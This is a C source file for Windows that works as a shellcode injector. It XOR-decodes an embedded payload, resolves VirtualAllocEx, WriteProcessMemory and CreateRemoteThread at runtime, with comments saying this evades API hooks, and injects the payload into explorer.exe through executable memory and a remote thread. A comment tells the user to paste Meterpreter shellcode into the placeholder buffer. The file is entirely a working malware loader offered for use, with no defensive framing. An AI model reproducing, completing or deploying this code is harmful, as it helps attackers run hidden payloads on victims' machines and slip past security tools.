#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// XOR-encoded shellcode
unsigned char encodedShellcode[] = "this is spot"; //for paste your shellcode as a single Line to here use "-f c | tr -d '\n' | sed 's/ //g' this one at end of your meterpreter call"
const char key = 0xAA; // XOR key

// XOR decryptor func
void DecryptShellcode(unsigned char *shellcode, size_t size) {
    for (size_t i = 0; i < size; i++) {
        shellcode[i] ^= key;
    }
}

// indirect func calls / evades API hooks
typedef LPVOID(WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE(WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

// Function pointers to Windows API calls
pVirtualAllocEx fnVirtualAllocEx;
pWriteProcessMemory fnWriteProcessMemory;
pCreateRemoteThread fnCreateRemoteThread;

int InjectShellcode(DWORD pid) {
    // resolve function addresses dynamically
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    fnVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
    fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
    fnCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return -1;

    // alloc mem in target proc
    void *alloc = fnVirtualAllocEx(hProcess, NULL, sizeof(encodedShellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // decrypt shellcode before writing
    DecryptShellcode(encodedShellcode, sizeof(encodedShellcode));

    // write shellcode into proc mem
    fnWriteProcessMemory(hProcess, alloc, encodedShellcode, sizeof(encodedShellcode), NULL);

    // exec shellcode in target proc
    fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);

    CloseHandle(hProcess);
    return 0;
}

// Get PID of target process
DWORD GetProcessID(const char *procname) {
    PROCESSENTRY32 pe;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        while (Process32Next(hSnap, &pe)) {
            if (strcmp(pe.szExeFile, procname) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return 0;
}

// Entry point
int main() {
    DWORD pid = GetProcessID("explorer.exe");
    if (pid) {
        InjectShellcode(pid);
    }
    return 0;
}
